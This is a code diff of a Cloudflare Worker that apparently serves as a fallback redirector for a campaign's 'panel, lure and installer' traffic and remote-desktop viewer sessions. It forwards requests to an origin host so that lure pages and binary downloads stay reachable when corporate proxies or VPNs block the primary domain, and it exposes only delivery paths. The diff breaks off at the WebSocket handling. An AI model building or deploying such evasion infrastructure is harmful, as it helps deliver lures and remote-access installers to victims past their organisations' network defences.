@@ -1,14 +1,49 @@
-// fleet edge fallback — proxies panel, lure and installer traffic through a
+// fleet edge fallback - proxies panel, lure and installer traffic through a
 // *.workers.dev (or custom) host when the primary domain is blocked by a
 // corporate proxy or VPN. WebSocket upgrades (RD viewer) pass straight through.
 //
 // The upstream origin is provided by the ORIGIN text binding (wrangler.toml or
-// the deploy script). Only paths that exist on the panel are reachable: the
-// Worker forwards the request verbatim and does not expose a directory tree.
+// the deploy script) and must be a PUBLIC lure host (e.g. get.example.com):
+// panel.<zone> sits behind Cloudflare Access, which would redirect the Worker.
+//
+// Only delivery paths are exposed (lure pages, installer, binaries, downloads).
+// The admin UI/API is intentionally not reachable through the fallback domain.
+
+const PUBLIC_PREFIXES = [
+  "/__lure.js",
+  "/__lure/target",
+  "/install/",
+  "/e/",
+  "/dl/",
+  "/_next/",
+  "/sites/",
+];
+
+const PUBLIC_EXACT = new Set([
+  "/",
+  "/favicon.ico",
+  "/robots.txt",
+  "/healthz",
+  "/healthz.json",
+]);
+
+function isPublic(pathname) {
+  if (PUBLIC_EXACT.has(pathname)) return true;
+  return PUBLIC_PREFIXES.some((p) => pathname.startsWith(p));
+}
+
 export default {
   async fetch(request, env) {
-    const origin = new URL(env.ORIGIN || "https://panel.telcom.stream");
+    const origin = new URL(env.ORIGIN || "https://get.example.com");
     const url = new URL(request.url);
+
+    if (!isPublic(url.pathname)) {
+      return new Response("not found\n", {
+        status: 404,
+        headers: { "Content-Type": "text/plain", "Cache-Control": "no-store" },
+      });
+    }
+
     const target = new URL(url.pathname + url.search, origin);
 
     if (request.headers.get("Upgrade") === "websocket") {
